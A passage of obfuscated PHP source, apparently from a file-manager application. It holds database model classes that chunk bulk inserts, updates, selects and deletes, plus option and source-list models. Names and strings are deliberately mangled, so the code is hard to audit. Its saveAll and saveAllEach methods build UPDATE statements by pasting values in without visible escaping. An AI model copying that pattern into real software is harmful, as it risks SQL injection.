call_user_func_array(array(&$this, $µúá›¢×[1]), array($û½‡ÑŞá[$ø³‚Ú‡ü])); } break; case $Ø„ê Õ[273]: $û½‡ÑŞá[$ø³‚Ú‡ü] = $û½‡ÑŞá[$µúá›¢×[1]]; break; case $Ø„ê Õ[294]: $Ç”í‹‹í = $û½‡ÑŞá[$ø³‚Ú‡ü]; $û½‡ÑŞá[$ø³‚Ú‡ü] = json_decode($Ç”í‹‹í, !0); if (is_null($û½‡ÑŞá[$ø³‚Ú‡ü])) { $û½‡ÑŞá[$ø³‚Ú‡ü] = $Ç”í‹‹í; } break; case $Ø„ê Õ[323]: if ($û½‡ÑŞá[$ø³‚Ú‡ü] === $Ø„ê Õ[12]) { unset($û½‡ÑŞá[$ø³‚Ú‡ü]); } break; case $Ø„ê Õ[324]: $û½‡ÑŞá[$ø³‚Ú‡ü] = $µúá›¢×[1]; break; default: break; } } } public function saveAll($•ÌĞ·ê) { $Û§Øä¢ =& $_SERVER[ñˆ‹ß¿÷]; $Š÷Óœ×· = $this->tablePrefix . $this->tableName; $­éµÊ—ø = self::SQL_WHERE_IN_CHUNK; $•ÌĞ·ê = is_array($•ÌĞ·ê) ? $•ÌĞ·ê : array(); $äêµÔŞ = $Û§Øä¢[378]; $éÔµ…î¬ = 0; $’è°È«¹ = array(); $ü¯â–Ã‰ = count($•ÌĞ·ê); for ($“‹®÷šâ = 0; $“‹®÷šâ < $ü¯â–Ã‰; $“‹®÷šâ++) { $îÓÊ±ó = $•ÌĞ·ê[$“‹®÷šâ]; if (!is_array($îÓÊ±ó) || count($îÓÊ±ó) != 4) { continue; } $¯‰„Èõ¸ = "\125\120\x44\101\x54\105\40\140{$Š÷Óœ×·}\140\40\x53\105\124\40{$îÓÊ±ó[2]}\x20\75\40\103\x41\x53\105\40{$îÓÊ±ó[0]}\40\xa"; if ($éÔµ…î¬ == 0) { $äêµÔŞ = $¯‰„Èõ¸; } $’è°È«¹[] = $Û§Øä¢[118] . $îÓÊ±ó[1] . $Û§Øä¢[118]; $éÔµ…î¬++; $äêµÔŞ .= "\x20\x57\x48\105\x4e\40\47{$îÓÊ±ó[1]}\x27\x20\x54\x48\105\116\x20\x27{$îÓÊ±ó[3]}\x27\40\xa"; if ($éÔµ…î¬ == $­éµÊ—ø || $“‹®÷šâ == $ü¯â–Ã‰ - 1) { $ÒˆëôŞ  = implode($Û§Øä¢[50], $’è°È«¹); $äêµÔŞ .= "\x20\x45\x4e\104\40\x20\x57\x48\x45\x52\105\40{$îÓÊ±ó[0]}\x20\111\116\40\50{$ÒˆëôŞ }\x29\40"; $this->execute($äêµÔŞ); $éÔµ…î¬ = 0; $äêµÔŞ = $¯‰„Èõ¸; $this->chunkEventCheck(count($’è°È«¹)); $’è°È«¹ = array(); } } $this->chunkEventSet(); } public function saveAllEach($‚“¾¾Ê‚) { $¦ïİ‰İ´ =& $_SERVER[ñˆ‹ß¿÷]; $ò¨£Œì = $this->tablePrefix . $this->tableName; foreach ($‚“¾¾Ê‚ as $ªö™´µÛ) { if (!is_array($ªö™´µÛ) || count($ªö™´µÛ) != 4) { continue; } $õş—ñ´× = $ªö™´µÛ[0] . $¦ïİ‰İ´[379] . $ªö™´µÛ[1] . $¦ïİ‰İ´[118]; $‹õËÓç» = $ªö™´µÛ[2] . $¦ïİ‰İ´[379] . $ªö™´µÛ[3] . $¦ïİ‰İ´[118]; $ï¸¤Õæ“ = "\165\160\144\141\x74\x65\40{$ò¨£Œì}\40\x73\x65\164\x20{$‹õËÓç»}\40\167\150\145\x72\145\x20{$õş—ñ´×}\73"; $this->execute($ï¸¤Õæ“); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($»÷Ø³¼· = false, $‰ùÖ¶Â† = false) { $this->_chunkEvent = $»÷Ø³¼·; $this->_chunkEventParam = $‰ùÖ¶Â†; } private function chunkEventCheck($§‰Ö¾‘) { if (!$this->_chunkEvent) { return; } $Îˆ§æÎĞ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Îˆ§æÎĞ[$_SERVER[ñˆ‹ß¿÷][380]] = $§‰Ö¾‘; Hook::trigger($this->_chunkEvent, $Îˆ§æÎĞ); } public function addAll($ÛñÀõ¢, $èêûÌú“ = array(), $¹¾±ü‹é = false) { $ùåÅ°ùÓ =& $_SERVER[ñˆ‹ß¿÷]; ignore_timeout(); $Ş…‰”Ö = self::SQL_WHERE_IN_CHUNK; if (empty($ÛñÀõ¢)) { $this->error = think_lang($ùåÅ°ùÓ[271]); return !1; } $èêûÌú“ = $this->_parseOptions($èêûÌú“); foreach ($ÛñÀõ¢ as $‡’…ÅÖá => $ıõ±§´¼) { $ÛñÀõ¢[$‡’…ÅÖá] = $this->_facade($ıõ±§´¼); $this->_beforeInsert($ÛñÀõ¢[$‡’…ÅÖá], $èêûÌú“); } if (method_exists($this->db, $ùåÅ°ùÓ[272])) { for ($· Ì’  = 0; $· Ì’  < count($ÛñÀõ¢); $· Ì’  += $Ş…‰”Ö) { $×ËÍ¤‚‹ = array_slice($ÛñÀõ¢, $· Ì’ , $Ş…‰”Ö); if (!is_array($×ËÍ¤‚‹) || count($×ËÍ¤‚‹) == 0) { break; } $£³Æ¹ÔØ = $this->db->insertAll($×ËÍ¤‚‹, $èêûÌú“, $¹¾±ü‹é); $this->chunkEventCheck(count($×ËÍ¤‚‹)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÛñÀõ¢ as $‡’…ÅÖá => $ıõ±§´¼) { $£³Æ¹ÔØ = $this->db->insert($ıõ±§´¼, $èêûÌú“, $¹¾±ü‹é); } $this->commit(); } if (!1 !== $£³Æ¹ÔØ) { $ş†ğò˜ñ = $this->getLastInsID(); if ($ş†ğò˜ñ) { return $ş†ğò˜ñ; } } return $£³Æ¹ÔØ; } public function save($èß×ëİ = '', $¨„ïáµ» = array()) { $ñÇù°¶Õ =& $_SERVER[ñˆ‹ß¿÷]; $“ø¬Ş²• = self::SQL_WHERE_IN_CHUNK; $È®·ğ = $this->optionsValue(); $ØÌÈ­Å» = $this->findWhereField($È®·ğ); if (!$ØÌÈ­Å») { return parent::save($èß×ëİ, $¨„ïáµ»); } $¹²›ô ğ = 0; $°Û©íü = $È®·ğ[$ñÇù°¶Õ[275]][$ØÌÈ­Å»][1]; $°Û©íü = is_array($°Û©íü) ? $°Û©íü : array(); $â†àŸ¬Û = count($°Û©íü); for ($¨¢¦æáÖ = 0; $¨¢¦æáÖ < $â†àŸ¬Û; $¨¢¦æáÖ += $“ø¬Ş²•) { $—õËÂ€ = array_slice($°Û©íü, $¨¢¦æáÖ, $“ø¬Ş²•); if (!is_array($—õËÂ€) || count($—õËÂ€) == 0) { break; } $È®·ğ[$ñÇù°¶Õ[275]][$ØÌÈ­Å»][1] = $—õËÂ€; $this->optionsValue($È®·ğ); $¹²›ô ğ += parent::save($èß×ëİ, $¨„ïáµ»); $this->chunkEventCheck(count($—õËÂ€)); } $this->chunkEventSet(); return $¹²›ô ğ; } public function add($ÃÌ³Š’¹ = '', $ê®ÜÅÀ´ = array(), $Òóà¸œ = false) { if ($this->addTaskStatus && is_array($ÃÌ³Š’¹)) { $this->addTaskData[] = $ÃÌ³Š’¹; return; } return parent::add($ÃÌ³Š’¹, $ê®ÜÅÀ´, $Òóà¸œ); } public function parseWhereLike($®•‚ËØ, $¿ˆôéçÒ = '', $Åâ“ô÷ö = false, &$åÏèúµ = false) { $µÛ¯Ë” =& $_SERVER[ñˆ‹ß¿÷]; $³ï×ãÑ© = $GLOBALS[$µÛ¯Ë”[6]][$µÛ¯Ë”[381]]; if (!$³ï×ãÑ©[$µÛ¯Ë”[382]]) { return $®•‚ËØ; } if (!is_array($®•‚ËØ)) { return $®•‚ËØ; } $¯¦¿éÎë = array(); $£ŒüÑ€ = 0; foreach ($®•‚ËØ as $—ãî³ğÛ => $¶¦™åÇª) { if (is_array($¶¦™åÇª) && count($¶¦™åÇª) == 2 && $¶¦™åÇª[0] == $µÛ¯Ë”[383] && is_string($¶¦™åÇª[1]) && substr($¶¦™åÇª[1], 0, 1) == $µÛ¯Ë”[384] && substr($¶¦™åÇª[1], strlen($¶¦™åÇª[1]) - 1, 1) == $µÛ¯Ë”[384]) { $åÏèúµ = !0; $÷ÕÏõïÌ = is_string($—ãî³ğÛ) ? $—ãî³ğÛ : $¿ˆôéçÒ; $É»Şì  = substr($¶¦™åÇª[1], 1, strlen($¶¦™åÇª[1]) - 2); $É»Şì  = $this->db->escapeString($É»Şì ); if (!strpos($÷ÕÏõïÌ, $µÛ¯Ë”[10])) { $÷ÕÏõïÌ = $µÛ¯Ë”[385] . $÷ÕÏõïÌ . $µÛ¯Ë”[385]; } $šİ§£ÑÊ = $µÛ¯Ë”[188] . $É»Şì  . $µÛ¯Ë”[188]; $É»Şì  = str_replace(array($µÛ¯Ë”[10], $µÛ¯Ë”[386], $µÛ¯Ë”[11]), $µÛ¯Ë”[387], $É»Şì ); if ($³ï×ãÑ©[$µÛ¯Ë”[388]]) { $šİ§£ÑÊ = $µÛ¯Ë”[389] . $É»Şì  . $µÛ¯Ë”[390]; if ($³ï×ãÑ©[$µÛ¯Ë”[391]]) { $šİ§£ÑÊ = $µÛ¯Ë”[390] . $É»Şì  . $µÛ¯Ë”[389]; } } $¯¦¿éÎë[$£ŒüÑ€] = $µÛ¯Ë”[392] . $÷ÕÏõïÌ . $µÛ¯Ë”[393] . $šİ§£ÑÊ . $µÛ¯Ë”[394]; $£ŒüÑ€++; continue; } if (is_array($¶¦™åÇª)) { $¿ˆôéçÒ = is_string($—ãî³ğÛ) ? $—ãî³ğÛ : $¿ˆôéçÒ; $¶¦™åÇª = $this->parseWhereLike($¶¦™åÇª, $¿ˆôéçÒ, !0, $åÏèúµ); } if (is_numeric($—ãî³ğÛ)) { $¯¦¿éÎë[$£ŒüÑ€] = $¶¦™åÇª; $£ŒüÑ€++; } else { $¯¦¿éÎë[$—ãî³ğÛ] = $¶¦™åÇª; } } if ($åÏèúµ && !$Åâ“ô÷ö) { } return $¯¦¿éÎë; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($áæ³öÇ = array()) { $ŞéôíÇĞ =& $_SERVER[ñˆ‹ß¿÷]; $µ©Á²û = self::SQL_WHERE_IN_CHUNK; $ˆšû«Ë = $this->optionsValue(); $œÈŒ€ Ó = $this->findWhereField($ˆšû«Ë); if (!$œÈŒ€ Ó || isset($ˆšû«Ë[$ŞéôíÇĞ[292]]) || isset($ˆšû«Ë[$ŞéôíÇĞ[353]])) { return parent::select($áæ³öÇ); } $ÆÏ·÷ = $ˆšû«Ë[$ŞéôíÇĞ[275]][$œÈŒ€ Ó][1]; $ÆÏ·÷ = is_array($ÆÏ·÷) ? $ÆÏ·÷ : array(); $ÓÕ‰İãœ = null; for ($ïŠœÄ¤˜ = 0; $ïŠœÄ¤˜ < count($ÆÏ·÷); $ïŠœÄ¤˜ += $µ©Á²û) { $ÅîÎß“ = array_slice($ÆÏ·÷, $ïŠœÄ¤˜, $µ©Á²û); if (!is_array($ÅîÎß“) || count($ÅîÎß“) == 0) { break; } $ˆšû«Ë[$ŞéôíÇĞ[275]][$œÈŒ€ Ó][1] = $ÅîÎß“; $this->optionsValue($ˆšû«Ë); $¤Äƒ§Î× = parent::select($áæ³öÇ); if (!$¤Äƒ§Î×) { continue; } $ÓÕ‰İãœ = is_array($ÓÕ‰İãœ) ? $ÓÕ‰İãœ : array(); $ÓÕ‰İãœ = array_merge($ÓÕ‰İãœ, $¤Äƒ§Î×); } return $ÓÕ‰İãœ; } public function delete($à„õÌÄ = array()) { $ĞˆàİÀ£ =& $_SERVER[ñˆ‹ß¿÷]; $¤ÃìñŠî = self::SQL_WHERE_IN_CHUNK; $„–Á¡›‘ = $this->optionsValue(); $…ôÀé ‹ = $this->findWhereField($„–Á¡›‘); if (!$…ôÀé ‹) { return parent::delete($à„õÌÄ); } $ÙÈšß¢É = 0; $Ó×µ©¦œ = $„–Á¡›‘[$ĞˆàİÀ£[275]][$…ôÀé ‹][1]; $Ó×µ©¦œ = is_array($Ó×µ©¦œ) ? $Ó×µ©¦œ : array(); for ($±Ç½ùÂ = 0; $±Ç½ùÂ < count($Ó×µ©¦œ); $±Ç½ùÂ += $¤ÃìñŠî) { $ÆÈ”¸”ö = array_slice($Ó×µ©¦œ, $±Ç½ùÂ, $¤ÃìñŠî); if (!is_array($ÆÈ”¸”ö) || count($ÆÈ”¸”ö) == 0) { break; } $„–Á¡›‘[$ĞˆàİÀ£[275]][$…ôÀé ‹][1] = $ÆÈ”¸”ö; $this->optionsValue($„–Á¡›‘); $ÙÈšß¢É += parent::delete($à„õÌÄ); } return $ÙÈšß¢É; } private function findWhereField($üß´ÕØí) { $ˆ­âÉî =& $_SERVER[ñˆ‹ß¿÷]; $¢Ş´“æ÷ = self::SQL_WHERE_IN_CHUNK; if (!is_array($üß´ÕØí) || !is_array($üß´ÕØí[$ˆ­âÉî[275]])) { return !1; } foreach ($üß´ÕØí[$ˆ­âÉî[275]] as $ı¾è™è => $ªÈĞœŸ­) { if (is_array($ªÈĞœŸ­) && isset($ªÈĞœŸ­[0]) && is_string($ªÈĞœŸ­[0]) && strtolower($ªÈĞœŸ­[0]) == $ˆ­âÉî[7] && is_array($ªÈĞœŸ­[1]) && count($ªÈĞœŸ­[1]) > $¢Ş´“æ÷) { ignore_timeout(); return $ı¾è™è; } } return !1; } public function setMasterDB($üµí°¤  = true) { think_config($_SERVER[ñˆ‹ß¿÷][395], $üµí°¤ ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\x6d\117\x70\164\x69\x6f\x6e"; public $field = array(); public function listData($ìóóù¼¡ = false, $”—¡‰Ş = "\x6d\157\144\x69\146\171\124\151\155\x65", $œãË¶¥ = false) { $ôÈÂø = Model($this->modelType)->get(!1, $this->optionType, !0); $„–°Õ×› = array_values($ôÈÂø); if ($„–°Õ×› && $„–°Õ×›[0] && !is_array($„–°Õ×›[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ôÈÂø = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ôÈÂø) { return $ìóóù¼¡ ? null : array(); } if (!$ìóóù¼¡) { $ôÈÂø = array_filter(array_values($ôÈÂø)); return array_sort_by($ôÈÂø, $”—¡‰Ş, $œãË¶¥); } return $ôÈÂø[$_SERVER[ñˆ‹ß¿÷][396] . $ìóóù¼¡]; } public function insert($¯Ì¦·Ç¬) { $è®ë¤ =& $_SERVER[ñˆ‹ß¿÷]; $¯Ì¦·Ç¬ = array_field_key($¯Ì¦·Ç¬, $this->field); $‡ÊöÚ„ = Model($this->modelType)->get($è®ë¤[397], $this->optionType . $è®ë¤[398]); $‡ÊöÚ„ = $‡ÊöÚ„ ? $‡ÊöÚ„ : 0; $¯Ì¦·Ç¬[$è®ë¤[399]] = ++$‡ÊöÚ„; $¯Ì¦·Ç¬[$è®ë¤[200]] = time(); $¯Ì¦·Ç¬[$è®ë¤[85]] = time(); Model($this->modelType)->set($è®ë¤[397], $‡ÊöÚ„, $this->optionType . $è®ë¤[398]); Model($this->modelType)->set($è®ë¤[396] . $‡ÊöÚ„, $¯Ì¦·Ç¬, $this->optionType); return $‡ÊöÚ„; } public function update($£ÎàÚö®, $å²¬åñ—) { $ÔˆÓê¨• =& $_SERVER[ñˆ‹ß¿÷]; $å²¬åñ— = array_field_key($å²¬åñ—, $this->field); $€ß±«§€ = $this->listData($£ÎàÚö®); if (!$€ß±«§€ || !$£ÎàÚö®) { return !1; } $å²¬åñ— = array_merge($€ß±«§€, $å²¬åñ—); $å²¬åñ—[$ÔˆÓê¨•[85]] = time(); return Model($this->modelType)->set($ÔˆÓê¨•[396] . $£ÎàÚö®, $å²¬åñ—, $this->optionType); } public function remove($í¬¾È) { if (!$í¬¾È) { return !1; } return Model($this->modelType)->remove($_SERVER[ñˆ‹ß¿÷][396] . $í¬¾È, $this->optionType); } public function clear() { $•¢¿Ï± =& $_SERVER[ñˆ‹ß¿÷]; Model($this->modelType)->remove($•¢¿Ï±[397], $this->optionType . $•¢¿Ï±[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($êÀÏ•˜, $ëéİÑ‡‰) { if (!$ëéİÑ‡‰) { return !1; } $–­°¼èú = $this->listData(); $–­°¼èú = array_to_keyvalue($–­°¼èú, $êÀÏ•˜); return isset($–­°¼èú[$ëéİÑ‡‰]) ? $–­°¼èú[$ëéİÑ‡‰] : !1; } public function findByName($‰ÒíıÄà) { return $this->findByKey($_SERVER[ñˆ‹ß¿÷][32], $‰ÒíıÄà); } protected function resetData($Ğæœ¢Ïø) { $ğäŒ¬úÑ =& $_SERVER[ñˆ‹ß¿÷]; $Ğæœ¢Ïø = is_array($Ğæœ¢Ïø) ? $Ğæœ¢Ïø : array(); $£¥²¥ = array(); for ($—ûÁÍÒ¹ = 0; $—ûÁÍÒ¹ < count($Ğæœ¢Ïø); $—ûÁÍÒ¹++) { $£¥²¥[$ğäŒ¬úÑ[396] . $Ğæœ¢Ïø[$—ûÁÍÒ¹][$ğäŒ¬úÑ[399]]] = $Ğæœ¢Ïø[$—ûÁÍÒ¹]; } return Model($this->modelType)->set($£¥²¥, !1, $this->optionType); } private function getAutoName($ÓÄŞÊ’) { $×æÙÄ† = array_to_keyvalue($this->listData(), $_SERVER[ñˆ‹ß¿÷][32]); if (!$×æÙÄ† || !isset($×æÙÄ†[$ÓÄŞÊ’])) { return $ÓÄŞÊ’; } for ($”¦ıÁœ“ = 1; $”¦ıÁœ“ < count($×æÙÄ†); $”¦ıÁœ“++) { $ñÂ†©Ö = $ÓÄŞÊ’ . "\x28{$”¦ıÁœ“}\51"; if (!isset($×æÙÄ†[$ñÂ†©Ö])) { return $ñÂ†©Ö; } } return $ñÂ†©Ö; } } goto e°øÊ‰»«ª; e°øÊ‰»«ª: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($‰¶ú¬¾ = false, $†Û¾…ıÎ = '', $¹ìÏƒğ» = false) { $‰Ğ¬˜êŠ =& $_SERVER[ñˆ‹ß¿÷]; $™Ê–»· = $this->cacheGet($†Û¾…ıÎ); $‡íÎ‚ˆï = $this->optionDefault($†Û¾…ıÎ); $‡íÎ‚ˆï = is_array($‡íÎ‚ˆï) ? $‡íÎ‚ˆï : array(); if (is_array($™Ê–»·)) { $™Ê–»· = array_merge($‡íÎ‚ˆï, $™Ê–»·); return $‰¶ú¬¾ ? isset($™Ê–»·[$‰¶ú¬¾]) ? $™Ê–»·[$‰¶ú¬¾] : null : $™Ê–»·; } $©Øñµà = $this->filterWhere(array($‰Ğ¬˜êŠ[33] => $†Û¾…ıÎ)); $™Ê–»· = $this->where($©Øñµà)->select(); $™Ê–»· = array_to_keyvalue($™Ê–»·, $‰Ğ¬˜êŠ[94], $‰Ğ¬˜êŠ[374]); foreach ($™Ê–»· as $ÀÅõ‘ù => $Ô¾¯æ é) { if ($¹ìÏƒğ» || in_array($ÀÅõ‘ù, $this->jsonField)) { $™Ê–»·[$ÀÅõ‘ù] = json_decode($Ô¾¯æ é, !0); } } $this->cacheSet($†Û¾…ıÎ, $™Ê–»·); $™Ê–»· = array_merge($‡íÎ‚ˆï, $™Ê–»·); return $‰¶ú¬¾ ? $™Ê–»·[$‰¶ú¬¾] : $™Ê–»·; } public function set($€•ìŒ¥Ë, $ĞÙşŸŞ = false, $«Å²‡² = '') { $ï˜Ğ§ÖŸ =& $_SERVER[ñˆ‹ß¿÷]; $this->cacheRemove($«Å²‡²); $³è¡éò¦ = array(); $ËŸ”á“ = is_array($€•ìŒ¥Ë) ? $€•ìŒ¥Ë : array($€•ìŒ¥Ë => $ĞÙşŸŞ); foreach ($ËŸ”á“ as $Ÿ’Å…Ûé => $½üÏäÆ‰) { if (is_array($½üÏäÆ‰)) { $½üÏäÆ‰ = json_encode_force($½üÏäÆ‰); } $this->checkLength($½üÏäÆ‰, !1, $this->tableName . $ï˜Ğ§ÖŸ[4] . $€•ìŒ¥Ë); $½üÏäÆ‰ = self::textEncode($½üÏäÆ‰); $ËŸ”á“ = array($ï˜Ğ§ÖŸ[33] => $«Å²‡², $ï˜Ğ§ÖŸ[94] => $Ÿ’Å…Ûé, $ï˜Ğ§ÖŸ[374] => $½üÏäÆ‰); $³è¡éò¦[] = $this->filterWhere($ËŸ”á“); } if (!$³è¡éò¦) { return !0; } $£ûê•… = $this->cacheKey($ï˜Ğ§ÖŸ[400]); CacheLock::lock($£ûê•…); $¥±ğ…œ = $this->addAll($³è¡éò¦, array(), !0); CacheLock::unlock($£ûê•…); return $¥±ğ…œ; } protected function optionDefault($†´ˆç‹© = '') { return !1; } public function setDeep($™šÑÕŸØ, $ğ¤¾İû¡ = false, $†›°ÅÈœ = '') { $½Ó…´ĞÇ = explode($_SERVER[ñˆ‹ß¿÷][10], $™šÑÕŸØ); $Ü”äşñ = $this->get(); array_set_value($Ü”äşñ, $™šÑÕŸØ, $ğ¤¾İû¡); $this->set($½Ó…´ĞÇ[0], $Ü”äşñ[$½Ó…´ĞÇ[0]], $†›°ÅÈœ); } public function remove($õÉĞˆı, $å‹±«¢ = '') { $ğŞ¦ûÈ =& $_SERVER[ñˆ‹ß¿÷]; $this->cacheRemove($å‹±«¢); $Şå¬¾‚³ = $this->filterWhere(array($ğŞ¦ûÈ[94] => $õÉĞˆı, $ğŞ¦ûÈ[33] => $å‹±«¢)); if (is_null($õÉĞˆı)) { unset($Şå¬¾‚³[$ğŞ¦ûÈ[94]]); } return $this->where($Şå¬¾‚³)->delete(); } public function cacheSet($‘ØÔ±®, $Æ´ûİÕß = false) { return Cache::set($this->cacheKey($‘ØÔ±®), $Æ´ûİÕß); } public function cacheGet($µïÔˆš™) { return Cache::get($this->cacheKey($µïÔˆš™)); } public function cacheRemove($Ä»Ö®Ò²) { return Cache::remove($this->cacheKey($Ä»Ö®Ò²)); } protected function filterWhere($Ä€âÛÙŒ) { return $Ä€âÛÙŒ; } protected function cacheKey($“³½ù§¨) { return $“³½ù§¨; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\143\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\141\155\145" => "\151\157\137\x73\x6f\165\162\x63\145\x5f\x6d\145\x74\141", "\x6d\x65\164\141\106\151\145\154\144" => "\x73\157\x75\x72\x63\x65\111\104"); protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\x69\155\x65", "\x74\x69\x6d\x65", "\151\x6e\x73\x65\162\164", "\x66\165\156\x63\164\x69\x6f\x6e"), array("\143\x72\145\141\164\x65\x54\151\155\145", "\164\x69\155\145", "\151\156\x73\145\162\x74", "\146\165\156\x63\x74\x69\x6f\156"), array("\166\151\145\167\124\x69\x6d\145", "\164\151\155\145", "\x69\156\x73\145\162\164", "\146\165\156\x63\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($äÖçÃ«“) { return $this->listSource(array($_SERVER[ñˆ‹ß¿÷][401] => $äÖçÃ«“)); } public function typeName($†­ıõÆä) { static $ëÅàî = array(self::TYPE_SYSTEM => "\x73\171\163\164\145\x6d", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\x67\x72\x6f\x75\160"); return $ëÅàî[$†­ıõÆä . $_SERVER[ñˆ‹ß¿÷][12]]; } public function sourceListInfo($‹¼ªğãâ, $¬™ÀïÆà = false) { $Î›îÛ¥µ =& $_SERVER[ñˆ‹ß¿÷]; $‹¼ªğãâ = $‹¼ªğãâ ? $‹¼ªğãâ : array(); $‹¼ªğãâ = array_filter(array_unique($‹¼ªğãâ)); if (!$‹¼ªğãâ) { return array(); } $®Ûú«Ô = $this->where(array($Î›îÛ¥µ[402] => array($Î›îÛ¥µ[7], $‹¼ªğãâ)))->select(); $this->_listDataApply($®Ûú«Ô, $¬™ÀïÆà); return array_to_keyvalue($®Ûú«Ô, $Î›îÛ¥µ[402]); } public function pathInfoFilter(&$ìÑèÕìî) { $›ƒº¼İ =& $_SERVER[ñˆ‹ß¿÷]; static $¡×Ç¬Š = false; static $ûŞù†Ï = false; static $îœ¤Èù = false; if (!$¡×Ç¬Š) { $¾óªÕ“ü = $›ƒº¼İ[403]; $¾óªÕ“ü .= $›ƒº¼İ[404]; $¾óªÕ“ü .= $›ƒº¼İ[405]; $¡Ş®‡ˆî = $›ƒº¼İ[406]; $‡í¹Æ¥  = explode($›ƒº¼İ[50], $¡Ş®‡ˆî); $¡×Ç¬Š = explode($›ƒº¼İ[50], $¾óªÕ“ü); $ûŞù†Ï = array(); foreach ($¡×Ç¬Š as $²ì¶ø ) { if (in_array($²ì¶ø , $‡í¹Æ¥ )) { continue; } $ûŞù†Ï[] = $²ì¶ø ; } $îœ¤Èù = explode($›ƒº¼İ[50], $›ƒº¼İ[407]); } foreach ($îœ¤Èù as $òË€‡ã¶) { if (isset($ìÑèÕìî[$òË€‡ã¶])) { $ìÑèÕìî[$òË€‡ã¶] = intval($ìÑèÕìî[$òË€‡ã¶]); } } $ìÑèÕìî[$›ƒº¼İ[84]] = $›ƒº¼İ[408] . $ìÑèÕìî[$›ƒº¼İ[402]] . $›ƒº¼İ[409]; $ìÑèÕìî[$›ƒº¼İ[33]] = $ìÑèÕìî[$›ƒº¼İ[410]] == 1 ? $›ƒº¼İ[75] : $›ƒº¼İ[199]; $ìÑèÕìî[$›ƒº¼İ[411]] = $this->typeName($ìÑèÕìî[$›ƒº¼İ[411]]); if ($ìÑèÕìî[$›ƒº¼İ[410]] != 1) { $ìÑèÕìî[$›ƒº¼İ[174]] = $ìÑèÕìî[$›ƒº¼İ[412]]; unset($ìÑèÕìî[$›ƒº¼İ[412]]); } $…Éˆ‰šğ = $¡×Ç¬Š; if (isset($ìÑèÕìî[$›ƒº¼İ[413]]) && $ìÑèÕìî[$›ƒº¼İ[413]][$›ƒº¼İ[414]] == -1) { $…Éˆ‰šğ = $ûŞù†Ï; } $ìÑèÕìî = array_field_key($ìÑèÕìî, $…Éˆ‰šğ); return $ìÑèÕìî; } public function listUserFav() { $æƒí¼ßŞ =& $_SERVER[ñˆ‹ß¿÷]; $Ù¬ùÄ›È = Model($æƒí¼ßŞ[415])->listData(); $õ²º€¹Ò = array_filter_by_field($Ù¬ùÄ›È, $æƒí¼ßŞ[33], $æƒí¼ßŞ[416]); $õ²º€¹Ò = array_to_keyvalue($õ²º€¹Ò, $æƒí¼ßŞ[12], $æƒí¼ßŞ[84]); if ($õ²º€¹Ò) { $¾µá£¶Ç = $this->listSource(array($æƒí¼ßŞ[417] => array($æƒí¼ßŞ[418], $õ²º€¹Ò))); } $¾µá£¶Ç = array_to_keyvalue($¾µá£¶Ç[$æƒí¼ßŞ[369]], $æƒí¼ßŞ[402]); foreach ($Ù¬ùÄ›È as &$’ˆş˜¨­) { $’ˆş˜¨­ = array($æƒí¼ßŞ[419] => $’ˆş˜¨­[$æƒí¼ßŞ[399]], $æƒí¼ßŞ[420] => $’ˆş˜¨­[$æƒí¼ßŞ[32]], $æƒí¼ßŞ[421] => $’ˆş˜¨­[$æƒí¼ßŞ[84]], $æƒí¼ßŞ[422] => $’ˆş˜¨­[$æƒí¼ßŞ[33]], $æƒí¼ßŞ[423] => $’ˆş˜¨­[$æƒí¼ßŞ[200]], $æƒí¼ßŞ[424] => $’ˆş˜¨­[$æƒí¼ßŞ[85]]); if ($’ˆş˜¨­[$æƒí¼ßŞ[33]] == $æƒí¼ßŞ[416] && $¾µá£¶Ç[$’ˆş˜¨­[$æƒí¼ßŞ[84]]]) { $’ˆş˜¨­[$æƒí¼ßŞ[86]] = $¾µá£¶Ç[$’ˆş˜¨­[$æƒí¼ßŞ[84]]]; } } unset($’ˆş˜¨­); return $Ù¬ùÄ›È; } public function listUserTag($¿ôÒùñÂ) { $âçå£â’ =& $_SERVER[ñˆ‹ß¿÷]; if ($¿ôÒùñÂ && !is_array($¿ôÒùñÂ)) { $¿ôÒùñÂ = array($¿ôÒùñÂ); } $´’¯ñÅš = Model($âçå£â’[425])->listData(); $Ğê‡«¦© = array(); $µş§Ê˜† = array(); foreach ($´’¯ñÅš as $×Ûá×¨€) { $ÉÈ…Ş¸× = $×Ûá×¨€[$âçå£â’[84]]; if (!$ÉÈ…Ş¸×) { continue; } if (!isset($µş§Ê˜†[$ÉÈ…Ş¸×])) { $µş§Ê˜†[$ÉÈ…Ş¸×] = array(); } $µş§Ê˜†[$ÉÈ…Ş¸×][] = $×Ûá×¨€[$âçå£â’[426]]; $Ğê‡«¦©[$×Ûá×¨€[$âçå£â’[84]]] = $×Ûá×¨€; } $ÉÏÚ€Š½ = array(); $ÕÉÀèï® = array(); $“à»¼å° = array(); foreach ($µş§Ê˜† as $³ò¢¿˜ => $°”ƒññ) { $ÂÕÃù‘ = !0; if (!$¿ôÒùñÂ) { $ÉÏÚ€Š½[] = $³ò¢¿˜; continue; } foreach ($¿ôÒùñÂ as $øÀ¶õ´¶) { if (!in_array($øÀ¶õ´¶, $°”ƒññ)) { $ÂÕÃù‘ = !1; break; } } if (!$ÂÕÃù‘) { continue; } if (!is_numeric($³ò¢¿˜)) { $¢ê‹è¿” = $Ğê‡«¦©[$³ò¢¿˜]; $Á÷¾§ÎÛ = array($âçå£â’[32] => $¢ê‹è¿”[$âçå£â’[32]], 